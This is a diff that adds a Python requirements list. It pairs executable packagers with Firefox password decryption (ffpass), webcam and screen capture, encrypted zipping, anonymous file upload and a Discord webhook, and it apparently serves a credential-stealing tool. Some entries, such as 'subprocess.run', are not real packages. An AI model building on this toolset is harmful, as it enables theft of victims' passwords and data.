@@ -1,0 +1,20 @@
+--upgrade pip
+pytest-shutil
+nuitka
+pyinstaller
+requests
+pywin32
+opencv-python
+Pillow
+pyzipper
+anonfile
+subprocess.run
+uuid
+typing
+psutil
+GPUtil
+tabulate
+pycryptodome
+configparser
+ffpass
+discord-webhook
